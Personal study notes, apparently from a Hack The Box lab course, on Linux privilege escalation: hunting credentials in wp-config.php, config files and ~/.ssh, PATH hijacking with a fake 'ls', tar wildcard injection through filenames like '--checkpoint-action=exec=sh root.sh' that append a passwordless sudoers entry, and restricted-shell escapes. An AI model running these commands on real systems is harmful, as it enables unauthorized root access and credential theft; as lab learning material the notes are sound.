---
title: 4. Credential Huntingand Environment Based Privledge Escalation
parent: Linux Privilege Escalation
layout: default
---
## Credential Hunting

- reference for basic credential hunting 

`/var` usually contains the web root for whatever web server is running. Could contain database credentials 

MySQL db in WordPress config file
```shell-session
grep 'DB_USER\|DB_PASSWORD' wp-config.php
```


Spool or mail directories:
```shell-session
 find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

accessible SSH private keys. Known hosts file to find targets. Contains public keys for all hosts in past, may be useful.
```shell-session
ls ~/.ssh
```

# Environment Based Privledge Escalation
## Path Abuse

PATH env variable sets directories where an executable can be located. Allows execution from any directory,
`echo $PATH`

Adding . to user's PATH adds pwd to list. Could replcae common binary such as ls with malicious script such as reverse shell. 

```shell-session
PATH=.:${PATH}
export PATH
```
We will be able to run binaries locaed in pwd  by just typing name of file, typing ls will call malicious script named ls in pwd insteda of /bin/ls

```shell-session
touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
```

## Wildcard Abuse

|**Character**|**Significance**|
|---|---|
|`*`|An asterisk that can match any number of characters in a file name.|
|`?`|Matches a single character.|
|`[ ]`|Brackets enclose characters and can match any single one at the defined position.|
|`~`|A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.|
|`-`|A hyphen within brackets will denote a range of characters.|

`tar` abuse with wildcards

`--checkpoint-action` option permits EXEC action to be executed when checkpoint is reached (i.e. run arbituary OS command once tar command executes)
By creating files with these names, when wildcard is specified, --checkpoint=1 and --checkpoint-action=exec=sh root.sh is passed to tar as command-line options

By creating files with these names, when the wildcard is specified, `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` is passed to `tar` as command-line options. Let's see this in practice.

cron job:
```shell-session
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```
this means every minute, execute `tar -zcf /home/htb-student/backup.tar.gz *`
The wildcard is expanded by shell before tar executes
Shelle expansion happens first. So * gets expanded to every filename in directory
tar supports special long options, 
--checkpoint=1
--checkpoint-action=exec=sh root.sh
means every 1 file processed, execute a command
execute sh root.sh

Attacker cannot modify cron job directly, but they can create files in directory.
If a filename starts with --something, after wildcard expansion it is passed to tar as a command-line argument
So we create files like "--checkpoint-action=exec=sh root.sh", --checkpoint=1
When
`tar -zcf backup.tar.gz *`
runs, expands * to
```
tar -zcf backup.tar.gz \
--checkpoint=1 \
--checkpoint-action=exec=sh root.sh \
root.sh \
otherfile.txt
```

In root.sh,  
`echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh`
It appends this to sudoes. Now usr has passwordless sudo.


```shell-session
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

```shell-session
htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```


## Escaping Restricted Shells

**RBASH**
restricted Bourne shell, ability to change directories, setting or modifying enviroment variables, executing commands in other directories.
**RKSH**
restrcited Korn shell,executing commands in other directories, creating or modifying shell environment, shell functions
**RZSH**
Z shell, most powerful and flexible command line interpreter. Limits running shell scripts, aliases, shell environment

**Command Injection**
`ls -l `pwd``
Command would cause ls command to be executed with argument `-l`, followed by output of pwd command. 
**Command Substitution**
backtick substitution for example
**Command Chaining**
using shell metacharacter
**Environment Variables**
**Shell functions**

**Simple Escape**
`echo $0` check what shell
its rbash, /bin/rbash, in /home/htb-user/bin
cannot run any commands except pwd, echo.
echo $(<flag.txt) works as it doesnt use cat. Replaces content of file
 




